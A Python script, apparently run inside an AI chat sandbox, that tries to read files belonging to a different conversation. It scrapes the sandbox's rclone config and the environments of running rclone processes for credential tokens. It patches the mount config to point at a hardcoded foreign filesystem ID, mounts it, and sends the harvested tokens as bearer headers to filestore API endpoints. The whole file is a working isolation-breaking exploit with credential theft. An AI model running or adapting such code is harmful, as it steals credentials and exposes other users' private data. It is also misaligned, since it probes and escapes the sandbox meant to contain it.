#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fsid_test.py -- cross-conversation read test.
Method A: HTTP with candidate tokens.
Method B: run the sandbox's own rclone with a patched config (reuses real auth).
Control: own filesystem_id, same method.
"""
import os, json, re, time, shutil, subprocess, http.client

FOREIGN = "claude_chat_01BG7VUnxm4QuArCfCzLZapE"
CFG     = "/dev/shm/rclone-boot/config.json"
RCLONE  = "/opt/rclone/rclone-filestore"
WORK    = "/tmp/fk"
OUT     = "/mnt/user-data/outputs/fsid-test.txt"
R = []
def rec(s): R.append(str(s)); print("[t]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d

cfg = rdo(CFG)
rec("CFG_LEN=%d" % len(cfg))
rec("CFG_HEAD=%s" % cfg[:200].replace("\n", "|"))
rec("CFG_TAIL=%s" % cfg[-300:].replace("\n", "|"))
self_fsid = (re.search(r"claude_chat_[A-Za-z0-9]+", cfg) or [None])
self_fsid = self_fsid.group(0) if hasattr(self_fsid, "group") else ""
rec("SELF_FSID=%s" % self_fsid)
rec("TARGET_FSID=%s" % FOREIGN)
rec("SAME=%s" % (self_fsid == FOREIGN))

# ---------- METHOD B: rclone with patched config (strongest)
def method_b(fsid, tag):
    if not os.path.exists(RCLONE) or not cfg: rec("B_%s=SKIP" % tag); return
    d = os.path.join(WORK, tag); dst = os.path.join(d, "out")
    os.makedirs(dst, exist_ok=True)
    try:
        j = json.loads(cfg)
    except Exception as e:
        rec("B_%s=CFG_JSON_ERR:%s" % (tag, e)); return
    for m in j.get("mounts", []):
        m["filesystem_id"] = fsid
        m["destination"] = dst
        m["readonly"] = True
    p = os.path.join(d, "config.json")
    open(p, "w").write(json.dumps(j))
    rec("B_%s_CFG=%s" % (tag, p))
    try:
        pr = subprocess.Popen([RCLONE, "multimount", "--config", p],
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        time.sleep(6)
        lst = subprocess.run(["ls", "-la", dst], capture_output=True, text=True).stdout
        rec("B_%s_LS=%s" % (tag, lst.replace("\n", " | ")[:600]))
        files = []
        for dp, _, fs in os.walk(dst):
            for f in fs: files.append(os.path.join(dp, f))
        rec("B_%s_FILES=%d" % (tag, len(files)))
        for f in files[:3]:
            rec("B_%s_SAMPLE %s = %s" % (tag, os.path.basename(f),
                                         rdo(f)[:200].replace("\n", "|")))
        try: pr.terminate(); pr.wait(timeout=3)
        except Exception: pr.kill()
        out = (pr.stdout.read() or "")[:400]
        rec("B_%s_LOG=%s" % (tag, out.replace("\n", "|")))
    except Exception as e:
        rec("B_%s=ERR:%s" % (tag, e))

# ---------- METHOD A: HTTP
cands = []
for v in re.findall(r'"([A-Za-z0-9_\-\.]{40,})"', cfg):
    if not v.startswith("claude_chat_"): cands.append(v)
for p in os.listdir("/proc"):
    if not p.isdigit(): continue
    if "rclone" not in rdo("/proc/%s/cmdline" % p, ""): continue
    for v in re.findall(r"[A-Za-z0-9_\-\.]{48,}", rdo("/proc/%s/environ" % p, "")): cands.append(v)
rec("CANDIDATES=%d" % len(cands))

def http(path, hdr):
    try:
        c = http.client.HTTPSConnection("api.anthropic.com", timeout=8)
        c.request("GET", path, headers=hdr); r = c.getresponse()
        b = r.read(200).decode("latin1", "replace"); c.close()
        return "%d %s" % (r.status, b.replace("\n", " ")[:120])
    except Exception as e: return "ERR:%s" % e

def method_a(fsid, tag):
    for ep in ("/v1/filestore/fs/%s/files", "/v1/filestore/fs/%s"):
        for lbl, h in [("noauth", {})] + \
                      [("bearer%d" % i, {"Authorization": "Bearer " + t}) for i, t in enumerate(cands[:5])]:
            rec("A_%s_%s %s -> %s" % (tag, lbl, ep % fsid, http(ep % fsid, h)))

rec("=== CONTROL (own fsid) ===")
if self_fsid: method_b(self_fsid, "self"); method_a(self_fsid, "self")
rec("=== TARGET (foreign fsid) ===")
method_b(FOREIGN, "target"); method_a(FOREIGN, "target")

b_ok = any(l.startswith("B_target_FILES=") and not l.endswith("=0") for l in R)
a_ok = any("A_target" in l and "-> 200" in l for l in R)
rec("METHOD_B_CROSS=%s" % b_ok)
rec("METHOD_A_CROSS=%s" % a_ok)
rec("VERDICT=%s" % ("CROSS_CONVERSATION_READ=YES" if (b_ok or a_ok) else "NO"))

os.makedirs(os.path.dirname(OUT), exist_ok=True)
open(OUT, "w").write("\n".join(R) + "\n")
print("report ->", OUT)